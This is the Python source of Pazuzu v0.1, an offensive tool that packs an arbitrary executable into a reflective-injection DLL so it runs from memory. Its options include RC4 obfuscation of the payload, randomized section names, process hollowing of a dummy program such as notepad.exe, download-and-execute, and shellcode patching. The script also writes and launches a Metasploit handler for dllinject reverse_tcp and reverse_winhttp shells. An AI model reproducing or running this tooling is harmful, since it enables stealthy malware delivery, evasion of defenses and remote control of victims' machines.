#!/usr/bin/env python

import argparse
import binascii
import os
import pefile
import random
import string
import subprocess
import sys
import textwrap
from argparse import RawTextHelpFormatter

from modules.rc4 import rc4_cipher
from modules.reflectivePatcher import reflective_patcher
from modules.sectionDoubleP import SectionDoubleP, SectionDoublePError


class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[32m'
    RED = '\033[0;31m'
    DEFAULT = '\033[39m'
    ORANGE = '\033[33m'
    WHITE = '\033[97m'


def banner():
    print Colors.RED + "NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmNNNNNNNNNNNN"
    print "NNNNNNNNNNNm/o//mNNNNNNNNNNh.+/NNNNNNNNNNNNm//+-mNNNNNNNNNN"
    print "NNNNNNNNNNN+.o`--mNNNNNNNd/.+y+/odNNNNNNNNm-:.---sNNNNNNNNN"
    print "NNNNNNNNNo.-+-.---mNNNNdo-`:++o:+/:hNNNNNm.--:-`+-dNNNNNNNN"
    print "NNNNNNNNh.o-..`.--:NNNNm---o/+++:+-NNNNNN--:--::+s:NNNNNNNN"
    print "NNNNNNNm/..-:/:-..`+mNNNd+-:::/--+mNNNNN/-/--``-.:/oNNNNNNN"
    print "NNNNNNNos-/osy.+o-`:-oNNNN/-:::-/mNNNms:.`---.`-.`.sNNNNNNN"
    print "NNNNNNNy..-dddy+`..----yNNd`./s`+NNd/.-::``-----..`dNNNNNNN"
    print "NNNNNNNN---`+h`.-:-`:--.--.:-odo//-...-:--` --`..+:yNNNNNNN"
    print "NNNNNNNNm/--.+s-----.`.oyodh+//smydss:`./:-`.---..+NNNNNNNN"
    print "NNNNNNNNNN+..`+h::/:`oho/yNNd+yNNd+ydms`:--- .-.-yNNNNNNNNN"
    print "NNNNNNNNNNN/`:.+mo.`oh::.`:/odh+//y.-sm../-/.`.-mNNNNNNNNNN"
    print "NNNNNNNNNNNy.-:`sNhso--:-.-/:`hNs+h.`oN+./+//.:/NNNNNNNNNNN"
    print "NNNNNNNNNNNNh-::-/o:.-.`-.::-`hNy+h.`+ss`-:--:sNNNNNNNNNNNN"
    print Colors.ORANGE + "PAZUZU v0.1 >>  Author: @BorjaMerino  www.shelliscoming.com\n" + Colors.DEFAULT


# Print some fields of each section
def info_section(section, pe, len):
    data = pe.get_memory_mapped_image()[section.VirtualAddress:]
    print "    New section added: %s" % section.Name
    print "      VirtualAddress: %s\n      VirtualSize: %d\n      RawSize: %s" % (hex(section.VirtualAddress),
                                                                                  section.Misc_VirtualSize,
                                                                                  hex(section.SizeOfRawData))
    print "      Short dump: "
    print textwrap.fill(repr(data[0:len]), 80, initial_indent='        ', subsequent_indent='        ')


# Summary info about the final pazuzu DLL (with the embedded payload)
def info_dll(pe):
    print Colors.GREEN + "\n[*] Pazuzu DLL info:"
    print Colors.DEFAULT + "    SizeOfImage: %s (%d bytes)" % (
        hex(pe.OPTIONAL_HEADER.SizeOfImage), pe.OPTIONAL_HEADER.SizeOfImage)
    if ".Conf" in pe.sections[-2].Name:
        info_section(pe.sections[-2], pe, 60)
    info_section(pe.sections[-1], pe, 120)


# Verbose info about the payload to embed into the DLL
def verbose_payload_info(pe):
    print Colors.DEFAULT + "    Number of sections: %d" % pe.FILE_HEADER.NumberOfSections
    for section in pe.sections:
        if ".reloc" in section.Name:
            print Colors.BLUE + "      %-8s VirtualAddres: %-8s  VirtualSize: %-8d" \
                                % (section.Name.rstrip(' \0'), hex(section.VirtualAddress), section.Misc_VirtualSize) \
                  + Colors.DEFAULT
        else:
            print "      %-8s VirtualAddres: %-8s  VirtualSize: %-8d " % (section.Name.rstrip(' \0'),
                                                                          hex(section.VirtualAddress),
                                                                          section.Misc_VirtualSize)

    print "    ImageBase: %s" % hex(pe.OPTIONAL_HEADER.ImageBase)
    print "    Entry Point: %s\n" % hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint + pe.OPTIONAL_HEADER.ImageBase)


# Check if the binary is .net app (look for the mscoree.dll)
def check_net(pe):
    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        for module in pe.DIRECTORY_ENTRY_IMPORT:
            if "mscoree.dll" in module.dll:
                return True
    return False


# Summary info about the options chosen by the user
def summary_payload(args, pe_buf):
    payload_downd = "./dlls/download-x86.dll"
    payload_reloc = "./dlls/reloc-x86.dll"
    payload_dfork = "./dlls/dforking-x86.dll"

    print Colors.ORANGE

    if args.d:
        print "[+] The payload will be downloaded and execute from disk"
        payload = payload_downd
    elif check_net(pe_buf):
        print "[?] It seems a .NET payload. The download and run approach is taken"
        payload = "./dlls/download-x86.dll"  # this will be changed soon to allow managed code to be relocated too
    else:
        if args.w or not (hasattr(pe_buf, 'DIRECTORY_ENTRY_BASERELOC')):
            print "[+] The payload will use dynamic forking"
            if args.k:
                print "[+] Dummy program used: " + args.k[0]
            payload = payload_dfork
        elif hasattr(pe_buf, 'DIRECTORY_ENTRY_BASERELOC'):
            print "[+] The binary will be relocated in the same address space of the target (.reloc present)"
            payload = payload_reloc

    print Colors.DEFAULT
    if args.v:
        print Colors.GREEN + "[*] Info payload: "
        verbose_payload_info(pe_buf)

    return payload


# Restore terminal color and exit
def restore(ext):
    print(Colors.DEFAULT)
    sys.exit(ext)


# MSF conf. Just for debugging purposes
def msf_conf(dll):
    path_rc = "/tmp/msf_conf"
    port = 4444
    filemsf = file(path_rc, "w")
    filemsf.write("use multi/handler\nset PAYLOAD windows/dllinject/reverse_tcp\nset LHOST 0.0.0.0\nset LPORT %i\n"
                  % port)
    filemsf.write("set DLL %s\nset ExitOnSession false\n run -j\r\n\r\n" % dll)
    filemsf.close()
    return path_rc


# Dump final dll and patch it with the bootstrap shellcode if it's requested"
def dump_payload(args, pe):
    if args.o:
        output_dll = args.o
    else:
        output_dll = "pazuzu.dll"

    pe.write(filename=output_dll)
    size_payload = os.path.getsize(output_dll)
    if size_payload > 4194304:
        print Colors.RED + "[!] Binary too long (%d bytes). Be sure your stager allocates enough memory" % size_payload
        print "    Some metasploit stagers allocates just 4194304 bytes (0x00400000)"
    print Colors.GREEN + "[*] Dll dumped: %s (%d bytes)" % (output_dll, size_payload)

    if args.p:
        reflective_patcher(output_dll, args.p)

    # Run msfconsole (-m option). Just for for debugging purposes
    if args.m:
        print Colors.GREEN + "[*] Running msfconsole ..."
        subprocess.Popen("msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/dllinject/reverse_winhttp; "
                         "set LHOST 0.0.0.0; set DLL %s; set LPORT 8080; run -j'" % output_dll, shell=True).wait()


# Get command-line options
def get_args():
    summary = 'Pazuzu is a Python script that allows you to embed a binary within a precompiled DLL which\n\
uses reflective DLL injection. The goal is that you can run your own binary from memory.\n'

    parser = argparse.ArgumentParser(
            prog='pazuzu.py',
            usage='%(prog)s [options] -f evil.exe',
            description=summary,
            formatter_class=RawTextHelpFormatter)

    parser.add_argument('-o', metavar='<file.dll>', help='output file (default: pazuzu.dll)', default='pazuzu.dll')
    parser.add_argument('-k', metavar='<file.exe>', help='full path of the binary to be hollowed '
                                                         'out (default: notepad.exe)', default=['notepad.exe'], nargs=1)
    parser.add_argument('-x', help="payload obfuscation (RC4 cipher)", action="store_true")
    parser.add_argument('-w', help="force dynamic forking", action="store_true")
    parser.add_argument('-v', help="verbose output", action="store_true")
    parser.add_argument('-d', help="download and run (noisy option)", action="store_true")
    parser.add_argument('-p', help="patch the reflective DLL with the bootstrap shellcode ",
                        choices=['thread', 'process', 'seh'])
    parser.add_argument('-m', help=argparse.SUPPRESS, action="store_true")
    required_arg = parser.add_argument_group('required argument')
    required_arg.add_argument('-f', metavar='<file.exe>', help='Binary (exe) to be executed', required=True)
    args = parser.parse_args()
    return args


# https://en.wikipedia.org/wiki/Edimmu
def main(argv):
    banner()
    args = get_args()

    try:
        buffer = open(args.f, "rb").read()
    except IOError as e:
        print Colors.RED + str(e)
        restore(1)

    pe_buf = pefile.PE(data=buffer)
    payload = summary_payload(args, pe_buf)

    try:
        pe = pefile.PE(payload)
        # Some bytes in the TimeDateStamp will be useful to change the behaviour of the dll
        pe.FILE_HEADER.TimeDateStamp = 0x00000000
        print Colors.GREEN + "[*] %s loaded" % payload
    except IOError as e:
        print Colors.RED + str(e)
        restore(1)

    # Obfuscate with RC4?
    if args.x:
        # Save random key in TimeDataStamp
        pe.FILE_HEADER.TimeDateStamp = int(binascii.hexlify(os.urandom(4)), 16)
        buffer = rc4_cipher(buffer, format(pe.FILE_HEADER.TimeDateStamp, 'x'))

    sections = SectionDoubleP(pe)

    # If dynamic forking and -k option, add .Conf section
    if args.k and ("forking" in payload):
        try:
            pe = sections.push_back(Characteristics=0x60000020, Data=args.k[0], Name=".Conf")
        except SectionDoublePError as e:
            print Colors.RED + str(e)
            restore(1)

    try:
        section_name = '.' + ''.join(random.choice(string.lowercase) for _ in range(random.randint(1, 6)))
        pe = sections.push_back(Characteristics=0x60000020, Data=buffer, RawSize=0x00000000, Name=section_name)
    except SectionDoublePError as e:
        print Colors.RED + str(e)
        restore(1)

    if args.v:
        info_dll(pe)

    dump_payload(args, pe)
    restore(0)


if __name__ == '__main__':
    main(sys.argv[1:])
